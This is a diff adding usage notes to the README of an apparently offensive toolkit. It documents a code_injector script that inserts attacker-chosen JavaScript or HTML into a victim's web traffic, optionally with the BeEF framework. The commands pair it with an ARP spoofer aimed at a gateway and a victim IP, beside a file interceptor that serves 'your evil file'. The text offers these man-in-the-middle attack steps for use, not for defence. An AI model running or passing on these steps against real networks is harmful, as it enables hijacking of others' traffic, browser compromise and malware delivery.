@@ -96,3 +96,18 @@ python arp_spoofer_v2.py -g <gatway_ip> -v <victim_ip>
 ```Bash
 python file_interceptor -e <extension> -f <link_to_your_evil_file>
 ```
+___
+### code_injector.py
+The script will inject the code (JavaScript, html, etc ...) that you want. Just put it in the variable "injection_code" in the script. Note that you can combine it with Beef framework.
+
+#### Use
+Python 2 or 3
+#### Example
+##### Open a terminal a run : 
+```Bash
+python arp_spoofer_v2.py -g <gatway_ip> -v <victim_ip>
+```
+##### In another terminal, run : 
+```Bash
+python code_injector
+```
